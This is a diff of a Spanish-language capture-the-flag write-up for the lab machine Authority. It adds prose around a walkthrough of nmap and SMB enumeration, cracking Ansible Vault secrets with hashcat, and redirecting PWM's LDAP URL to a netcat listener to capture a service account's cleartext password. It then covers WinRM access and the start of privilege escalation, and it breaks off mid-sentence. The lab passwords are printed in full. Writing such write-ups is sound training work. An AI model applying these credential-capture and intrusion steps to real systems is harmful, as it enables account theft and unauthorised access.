@@ -23,7 +23,7 @@ layout:
 
 ## Reconnaissance
 
-
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Authority**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.222 -oG allPorts
@@ -102,7 +102,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.18 seconds
            Raw packets sent: 79038 (3.478MB) | Rcvd: 62564 (2.503MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -115,7 +115,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.18 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. Verificamos a través del resultado obtenido de que la máquina se trata de un Domain Controller (DC) por los puertos y servicios que se encuentran expuestos.
 
 ```bash
 ❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49692,49693,49695,49696,49704,49709,53230,53249 10.10.11.222 -A -oN targeted -oX targetedXML
@@ -213,7 +213,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 87.49 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -222,45 +222,46 @@ Nmap done: 1 IP address (1 host up) scanned in 87.49 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
-
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (441).png" alt=""><figcaption></figcaption></figure>
 
-
+A través de la herramienta de `nxc` y `ldapsearch` enumeraremos el equipo para localizar más información. Entre la información obtenida, verificamos el `hostname`, versión del SO y el nombre del dominio.
 
 ```bash
 ❯ nxc smb 10.10.11.222
 SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
+
 ❯ ldapsearch -x -H ldap://10.10.11.222 -s base | grep defaultNamingContext
 defaultNamingContext: DC=authority,DC=htb
 ```
 
-
+Añadiremos en nuestro archivo `/etc/hosts` las entradas correspondientes para que a la hora de hacer referencia al dominio o el equipo, nos responda correctamente a la dirección IP del Domain Controller.
 
 ```bash
-❯ catnp /etc/hosts | grep authority
+❯ cat /etc/hosts | grep authority
 10.10.11.222 authority.htb AUTHORITY.authority.htb
 ```
 
 ## Web Enumeration
 
-
+Comprobaremos las páginas web que se encuentran expuestas en el Domain Controller. Para empezar, al acceder a [http://10.10.11.222](http://10.10.11.222) nos encontramos con la página principal de `IIS` (Internet Internet Information Services).
 
 <figure><img src="../../.gitbook/assets/imagen (442).png" alt=""><figcaption></figcaption></figure>
 
+Al acceder a [https://10.10.11.222:8443](https://10.10.11.222:8443) se nos muestra la siguiente página web en la cual se trata de `PWM`, la cual nos ofrece un panel de inicio de sesión para proporcionar credenciales y dos opciones para abrir la configuración.
 
+{% hint style="info" %}
+[PWM](https://github.com/pwm-project/pwm) es una aplicación de autoservicio de contraseñas de código abierto para directorios LDAP.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (443).png" alt=""><figcaption></figcaption></figure>
 
-
+Al acceder a cualquier de las opciones presentes, se nos requiere también proporcionar credenciales válidas para acceder al `PWM`. Deberemos de intentar buscar alguna vía para ver si logramos obtener credenciales de acceso o averiguar si hay otro vector de ataque.
 
 <figure><img src="../../.gitbook/assets/imagen (445).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+Realizaremos una enumeración de directorios y páginas web en la página web del `IIS`y no obtenemos resultado interesante. También probamos en la página del `PWM`pero tampoco logramos encontrar nada interesante.
 
 ```bash
 ❯ feroxbuster -u http://10.10.11.222/ -t 200 -C 500,502,404
@@ -291,11 +292,11 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 [####################] - 19s    30002/30002   1555/s  http://10.10.11.222/  
 ```
 
-
-
 ## SMB Enumeration
 
+Revisaremos el servicio `SMB` y comprobamos que el usuario `guest` se encuentra habilitado, por lo tanto tenemos la posibilidad de recopilar información con este usuario, como verificar si dispone de acceso algún recurso compartido, realizar un ataque de `RID Cycling Attack`, etc.
 
+Comprobamos que a través del usuario `guest` dispone de acceso a un recurso compartido llamado `Development`, dado que dispone de permisos de `READ`.
 
 ```bash
 ❯ nxc smb 10.10.11.222 -u 'guest' -p ''
@@ -316,9 +317,9 @@ SMB         10.10.11.222    445    AUTHORITY        NETLOGON                    
 SMB         10.10.11.222    445    AUTHORITY        SYSVOL                          Logon server share 
 ```
 
+Montaremos este recurso compartido en nuestro directorio `/mnt/shares` que tenemos creado en nuestro equipo local previamente.
 
-
-
+Verificaremos que la montura a través de `cifs` se ha realizado correctamente y disponemos del contenido del recurso compartido. Verificando que disponemos del recurso en local, copiaremos el directorio de manera recursvia al directorio de trabajo en el cual nos encontramos trabajando, para no tener problemas de lentitud, etc.
 
 ```bash
 ❯ sudo mount -t cifs -o username='guest',password='' '//10.10.11.222/Development' /mnt/shares
@@ -328,7 +329,9 @@ drwxr-xr-x root root 0 B Fri Mar 17 14:20:40 2023  Automation
 ❯ cp -r /mnt/shares/Automation .
 ```
 
+Accederemos al directorio `Automation` y comprobaremos la estructura del recurso compartido.&#x20;
 
+Como podemos observar, la estructura del directorio `Automation` está organizada en varias subcarpetas, entre ellas `Ansible, LDAP, PWM, y SHARE`. Cada una de estas carpetas contiene varios archivos y subdirectorios que parecen ser parte de configuraciones relacionadas con la automatización y administración de sistemas.
 
 ```bash
 ❯ cd Automation
@@ -416,13 +419,11 @@ drwxr-xr-x root root 0 B Fri Mar 17 14:20:40 2023  Automation
 27 directories, 52 files
 ```
 
-
-
 ## Initial Foothold
 
 ### Cracking Ansible Vault Secrets with Hashcat
 
-Automation/Ansible/PWM/defaults
+Revisamos los archivos disponibles en el directorio y encontramos uno en particular dentro de `Automation/Ansible/PWM/defaults`, que contiene varias cadenas cifradas con **Ansible Vault**. Estas cadenas están relacionadas con contraseñas y configuraciones críticas, como el usuario y contraseña del administrador de PWM y el administrador de LDAP.
 
 ```yaml
 ---
@@ -462,11 +463,12 @@ ldap_admin_password: !vault |
           3764
 ```
 
+Para lograr el formato adecuado de los hashes y poder crackearlos con Hashcat, hemos seguido los siguientes pasos:
 
+1. **Extracción del contenido**: Hemos obtenido los tres hashes desde los archivos `pwm_admin_login`, `pwm_admin_password`, y `ldap_admin_password`, los cuales estaban mal formateados debido a espacios y saltos de línea innecesarios.
+2. **Formateo adecuado**: Hemos utilizado `awk` y `tr` para eliminar los espacios y saltos de línea, dejando los hashes en el formato correcto. Cada uno de los archivos ahora contiene solo el hash en formato continuo, como se muestra a continuación:
 
 {% embed url="https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/" %}
-
-
 
 ```bash
 ❯ cat pwm_admin_login pwm_admin_password ldap_admin_password
@@ -500,7 +502,10 @@ $ANSIBLE_VAULT;1.1;AES256
 633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
 ```
 
+Para continuar con el proceso de cracking de los hashes obtenidos desde los archivos de Ansible Vault, hemos seguido los siguientes pasos:
 
+1. **Extracción de hashes con `ansible2john`**: Utilizamos el comando `ansible2john` para convertir los archivos de Ansible Vault en un formato compatible con herramientas como **John the Ripper** o **Hashcat**. Esto nos permite obtener los hashes en su forma estructurada para ser crackeados.
+2. **Contenido de los hashes**: El resultado de la ejecución del comando muestra los hashes extraídos de los tres archivos. A continuación, el contenido de los hashes:
 
 ```bash
 ❯ ansible2john pwm_admin_login pwm_admin_password ldap_admin_password | tee hashes > hashes
@@ -510,7 +515,9 @@ pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2dd
 ldap_admin_password:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
 ```
 
+Al crackear los hashes de Ansible Vault con **Hashcat**, utilizando el siguiente comando:
 
+Nos encontramos con que los tres hashes, correspondientes a `pwm_admin_login, pwm_admin_password y ldap_admin_password`, fueron descifrados con la misma contraseña:
 
 ```bash
 ❯ hashcat -a 0 -m 16900 hashes /usr/share/wordlists/rockyou.txt --user
@@ -527,41 +534,13 @@ Hashes: 3 digests; 3 unique digests, 3 unique salts
 Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
 Rules: 1
 
-Optimizers applied:
-* Zero-Byte
-* Slow-Hash-SIMD-LOOP
-
-Watchdog: Temperature abort trigger set to 90c
-
-Host memory required for this attack: 2 MB
-
-Dictionary cache hit:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344387
-* Bytes.....: 139921528
-* Keyspace..: 14344387
-
-Cracking performance lower than expected?                 
-
-* Append -w 3 to the commandline.
-  This can cause your screen to lag.
-
-* Append -S to the commandline.
-  This has a drastic speed impact but can be better for specific attacks.
-  Typical scenarios are a small wordlist but a large ruleset.
-
-* Update your backend API runtime / driver the right way:
-  https://hashcat.net/faq/wrongdriver
-
-* Create more work items to make use of your parallelization power:
-  https://hashcat.net/faq/morework
 
 $ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
 $ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
 $ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
 ```
 
-
+A través de la herramienta de `ansible-vault` trataremos de desencriptar las credenciales de `Ansible`. FInalmente, logramos obtener las credenciales del usuario `PWM` y credenciales de un usuario de `LDAP`.
 
 ```bash
 ❯ cat pwm_admin_login | ansible-vault decrypt; echo
@@ -578,60 +557,46 @@ Decryption successful
 DevT3st@123
 ```
 
-
-
 ## Initial Access
 
 ### Accesing on PWM (Password Recovery Tool from LDAP)
 
+Verificaremos si con estas credenciales podemos acceder a la página web de `PWM` ([https://10.10.11.222:8443](https://10.10.11.222:8443)). En este caso, se nos muestra un mensaje de error indicando el siguiente mensaje: `Directory unaivailable`.
 
+<figure><img src="../../.gitbook/assets/imagen (446).png" alt="" width="563"><figcaption></figcaption></figure>
 
-```bash
-❯ nxc smb 10.10.11.222 -u 'svc_pwm' -p 'pWm_@dm!N_!23'
-SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
-SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23 (Guest)
-```
+Accederemos a la opción de `Configuration Editor` ([https://10.10.11.222:8443/pwm/private/config/login](https://10.10.11.222:8443/pwm/private/config/login)) e ingresaremos las credenciales del usuario `PWM`que hemos obtenido de `Ansible`.
 
-
-
-<figure><img src="../../.gitbook/assets/imagen (446).png" alt=""><figcaption></figcaption></figure>
-
-
-
-<figure><img src="../../.gitbook/assets/5212_vmware_aEObt8usUd.png" alt=""><figcaption></figcaption></figure>
-
-
+<figure><img src="../../.gitbook/assets/5212_vmware_aEObt8usUd.png" alt="" width="563"><figcaption></figcaption></figure>
 
 ### Abusing PWM to modify the LDAP URL to our IP to obtain the saved password
 
+Comprobamos que finalmente hemos logrado acceder al `PWM` con las credenciales proporcionadas. Estando dentro de la herramienta, comprobamos que en el apartado de `LDAP Connection` aparece la configuración de la conexión al servidor LDAP ([ldaps://authority.htb:636/](ldaps://authority.htb:636/)).
 
+En esta configuración, se aprecia que hay un `Value stored` en el apartado de `LDAP Proxy Password`, lo que siguiere que las credenciales del usuario `svc_ldap` que es el que aparece en el apartado de `LDAP Proxy User` se encuentran almacenadas en la configuración de `PWM`.
 
 <figure><img src="../../.gitbook/assets/imagen (447).png" alt=""><figcaption></figcaption></figure>
 
-
+Probamos de modificar el `LDAP URLs` y comprobamos que al parecer nos permite editar la URL del servidor LDAP contra el cual se autentica este usuario con las credenciales guardadas. Por lo tanto, si tenemos permisos para editar la URL del servidor LDAP para que apunte a nuestra dirección IP, quizás podamos obtener las credenciales de la autenticación de las credenciales almacenadas.&#x20;
 
 <figure><img src="../../.gitbook/assets/5215_vmware_hOPxHyJuSV.png" alt=""><figcaption></figcaption></figure>
 
-
+Por lo tanto, nos pondremos en escucha por el puerto `389` que es el puerto predeterminado de `LDAP`.
 
 ```bash
 ❯ nc -nlvp 389
 listening on [any] 389 ...
 ```
 
-
-
-
+Editaremos la `LDAP URLs` para indicar nuestro servidor LDAP ficticio de nuestro servidor.
 
 <figure><img src="../../.gitbook/assets/imagen (448).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+Comprobamos que se ha logrado modificar el servidor LDAP configurado en `PWM`. Le daremos a la opción de `Test LDAP Profile`para comprobar si a nuestro servidor LDAP ficticio nos llega algún tipo de información, como la autenticación de las credenciales almacenadas.
 
 <figure><img src="../../.gitbook/assets/imagen (449).png" alt=""><figcaption></figcaption></figure>
 
-
+Comprobamos que se ha recibido las credenciales almacenadas del usuario `svc_ldap` correctamente, esto debido a que hemos logrado modificar el servidor LDAP por el nuestro propio y el usuario almacenadado en la configuración del `PWM` se ha autenticado en nuestro servidor y no en el del DC.
 
 ```bash
 ❯ nc -nlvp 389
@@ -640,15 +605,15 @@ connect to [10.10.16.3] from (UNKNOWN) [10.10.11.222] 64084
 0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!
 ```
 
-
+Obtenemos el mismo resultado capturando el protocolo `LDAP` a través de `Wireshark`.
 
 <figure><img src="../../.gitbook/assets/5218_vmware_BlHzr3m05W.png" alt=""><figcaption></figcaption></figure>
 
-
-
 ### Abusing WinRM - EvilWinRM
 
+Verificamos que las credenciales obtenidas del usuario `svc_ldap` son válidas y también que nos podemos conectar remotamente al Domain Controller.
 
+Al acceder a través de `evil-winrm` al DC, hemos logrado acceder y&#x20;
 
 ```bash
 ❯ nxc smb 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
@@ -667,16 +632,14 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> type ../Desktop/user.txt
-8af7e6062866023a6f93c2ad4edb882f
+8af7e606************************
 ```
-
-
 
 ## Privilege Escalation&#x20;
 
-
-
 ### DC Enumeration (adPEAS) - Powershell tool to automate Active Directory enumeration
+
+Debido que nos encont
 
 ```bash
 ❯ wget https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1
